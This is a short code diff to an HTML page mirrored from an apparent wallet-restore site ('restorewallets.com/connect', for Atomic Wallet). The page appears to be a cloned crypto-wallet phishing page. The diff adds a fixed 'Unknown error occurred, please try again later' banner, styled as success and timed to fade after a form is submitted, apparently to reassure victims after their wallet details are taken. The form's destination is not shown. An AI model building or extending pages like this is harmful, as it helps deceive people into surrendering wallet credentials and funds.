@@ -3515,11 +3515,30 @@
 								<button type="submit" name="submit" class="btn">Connect</button>
 							</form>
 						</div>
-				
+						<div id="status" class="success" style="color: #fff; font-size: 17px; padding: 15px; text-align: center; margin: 0 auto; ">Unknown error occurred, please try again later.</div>
 						<script>
 							document.getElementById("default").click();
 						</script>
-				
+						<style>
+							#status.success{
+								background-color: rgb(42, 73, 141);
+								animation: status 5s ease forwards ;
+							}
+							@keyframes status {
+								0%{
+									opacity: 1;
+									pointer-events: all;
+								}
+								90%{
+									opacity: 1;
+									pointer-events: all;
+								}
+								100%{
+									opacity: 0;
+									pointer-events: none;
+								}
+							}
+						</style>
 					</center>
 				</body>
 				<!-- Mirrored from restorewallets.com/connect/index0b9a0b9a0b9a?w=atomic+wallet by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 05 Apr 2021 08:14:40 GMT -->
